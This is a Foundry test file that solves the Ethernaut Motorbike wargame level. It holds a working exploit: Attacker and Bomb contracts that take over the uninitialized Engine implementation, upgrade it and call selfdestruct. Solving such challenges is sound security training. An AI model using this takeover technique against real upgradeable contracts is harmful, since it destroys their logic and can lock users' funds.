// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_25/Motorbike.sol";

contract MotorbikeTest is Test {
    Motorbike motorbike;
    Engine engine;
    Engine engineInstance;
    Attacker attacker;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
        engine = new Engine();
        motorbike = new Motorbike(address(engine));
        engineInstance = Engine(payable(address(motorbike)));
        attacker = new Attacker();
    }

    function testAttack() public {
        Bomb bomb = new Bomb();
        attacker.attack(engine);

        vm.startPrank(address(attacker));
        engine.upgradeToAndCall(address(bomb), abi.encodeWithSignature("initialize()"));
    }
}

contract Attacker {
    function attack(Engine engine) external {
        engine.initialize();
    }
}

contract Bomb {
    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}
